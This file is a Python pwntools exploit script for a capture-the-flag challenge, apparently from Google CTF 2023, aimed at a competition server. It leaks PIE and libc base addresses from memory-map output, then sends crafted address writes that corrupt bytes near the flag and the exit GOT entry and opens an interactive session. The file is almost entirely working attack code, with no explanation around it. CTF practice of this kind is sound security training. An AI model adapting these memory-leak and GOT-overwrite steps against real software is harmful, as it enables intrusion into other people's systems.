#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('chal')
		if debug:
			gdb.attach(s, gdbscript='''
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('wfw1.2023.ctfcompetition.com', 1337)

	return s

s = conn()

elf = ELF('chal')
libc = ELF('libc.so.6')


for i in range(9):
    s.recvline()

leak = s.recvuntil(b'r--p 00000000')
pie_base = int(leak[:12], 16)
log.info('pie_base : ' + hex(pie_base))

for i in range(7):
    s.recvline()
leak = int(s.recvuntil(b'r--p 00000000 00:11e 811203')[:12], 16)
log.info('libc_base :' + hex(leak))

# target = pie_base + 0x00000000000022B05 # Somehow you got here??
# buf = hex(target).encode() + b' ' + b'9'
# s.sendline(buf)

flag = pie_base + 0x00000000000050A0 - 0x3
buf = hex(flag).encode() + b' ' + b'4'  
s.sendline(buf)

exit_got = pie_base + 0x4050 
buf = hex(exit_got).encode() + b' ' + b'1'
s.sendline(buf)

s.interactive()

